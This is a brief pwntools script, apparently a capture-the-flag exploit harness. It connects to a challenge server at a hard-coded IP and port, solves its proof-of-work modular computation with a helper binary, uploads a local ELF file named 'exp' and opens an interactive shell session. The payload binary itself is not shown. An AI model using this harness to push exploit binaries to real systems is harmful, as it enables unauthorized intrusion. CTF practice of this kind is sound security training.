from pwn import     *

if args.LOCAL:
    io=process(['python3', 'server.py'])
else:
    io=remote('111.231.174.57', 3892)
    io.recvuntil(b'Show me your computation:')
    io.recvline()
    expr = [int(x) for x in io.recvuntil('mod ')[:-4].strip().replace(b'(',b'').replace(b')', b'').split(b'^')][-1] 
    mod = int(io.recvuntil(' ').strip())
    oth = process(['./a.out', str(expr), str(mod)]) 
    io.sendlineafter('answer: ', oth.recvline())

with open("exp", "rb") as f:
    data=f.read()
    
io.sendlineafter(b'Size of your ELF: ', str(len(data)).encode())
io.sendlineafter(b'ELF File:\n', data)
io.interactive()